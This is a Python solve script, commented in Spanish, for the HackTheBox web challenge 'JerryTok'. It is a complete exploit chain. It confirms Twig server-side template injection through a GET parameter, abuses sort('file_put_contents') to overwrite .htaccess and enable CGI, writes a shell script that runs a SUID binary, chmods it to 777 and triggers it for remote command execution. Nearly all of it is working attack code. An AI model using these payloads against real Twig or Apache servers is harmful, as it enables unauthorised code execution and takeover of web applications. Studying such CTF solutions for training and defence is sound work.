#!/usr/bin/env python3
# solve.py — Exploit de JerryTok (HTB Web, Medium)
# Cadena: SSTI en Twig -> .htaccess (habilita CGI) -> script CGI
#         -> /readflag (SUID) -> flag
#
# Las 4 variables salen del analisis de los archivos del reto:
#   TARGET_URL -> Start Instance en HTB
#   PARAMETRO  -> DefaultController.php: el GET interpolado en Twig
#   WEB_ROOT   -> httpd.conf: DocumentRoot (con AllowOverride All)
#   BINARIO    -> Dockerfile: /readflag compilado con chmod 4755 (SUID)

import requests

# ----------------------- DATOS DEL ANALISIS -----------------------
TARGET_URL = "http://154.57.164.70:42949"   # <- Start Instance en HTB
PARAMETRO  = "location"                      # <- DefaultController.php
WEB_ROOT   = "/www/public"                   # <- httpd.conf (DocumentRoot)
BINARIO    = "/readflag"                     # <- Dockerfile (SUID 4755)
SHELL      = "shell.nriver"                  # extension que registramos como cgi-script

if "IP:PUERTO" in TARGET_URL:
    raise SystemExit("[!] Llena TARGET_URL con la IP:PUERTO de la instancia de HTB")

def ssti(payload):
    """Envia un payload por el parametro vulnerable y devuelve la respuesta."""
    r = requests.get(TARGET_URL, params={PARAMETRO: payload}, timeout=15)
    return r.text

print("[*] JerryTok — cadena SSTI -> CGI contra", TARGET_URL)

# 1) Confirmar el SSTI: Twig evalua la expresion (debe aparecer 49)
print("[1] PoC {{7*7}} ->", ssti("{{7*7}}").strip()[:120])

# 2) Sobrescribir .htaccess para habilitar CGI en el DocumentRoot
htaccess = "Options +ExecCGI\nAddHandler cgi-script .nriver\n"
ssti("{{['%s/.htaccess','%s']|sort('file_put_contents')}}" % (WEB_ROOT, htaccess))
print("[2] .htaccess escrito: CGI habilitado para la extension .nriver")

# 3) Escribir el script CGI que ejecuta el binario SUID
#    (el 'echo &&' inicial manda la linea en blanco que CGI exige
#     como fin de cabeceras, antes del contenido)
script = "#!/bin/sh\n\necho && %s\n" % BINARIO
ssti("{{['%s/%s','%s']|sort('file_put_contents')}}" % (WEB_ROOT, SHELL, script))
print("[3] %s escrito" % SHELL)

# 4) Darle permiso de ejecucion (511 decimal = 0777 octal)
ssti("{{['%s/%s',511]|sort('chmod')}}" % (WEB_ROOT, SHELL))
print("[4] chmod 777 aplicado")

# 5) Visitar el script: Apache lo ejecuta como CGI -> /readflag -> flag
r = requests.get(TARGET_URL + "/" + SHELL, timeout=15)
print("[5] Respuesta del CGI:")
print(r.text)
